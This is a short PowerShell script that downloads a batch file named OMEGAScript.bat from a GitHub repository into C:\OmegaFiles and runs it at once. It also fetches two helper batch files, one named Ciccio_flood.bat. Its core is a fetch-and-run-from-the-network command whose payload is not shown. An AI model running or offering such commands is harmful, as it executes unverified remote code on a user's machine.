# Set a persistent folder for all downloads
$folder = "C:\OmegaFiles"
New-Item -ItemType Directory -Path $folder -Force | Out-Null

# Download the main script and run it
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile "$folder\OMEGAScript.bat"
Start-Process "$folder\OMEGAScript.bat"

# Download the helper files (do not run them)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$folder\Ciccio_flood.bat"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat' -OutFile "$folder\folder.bat"
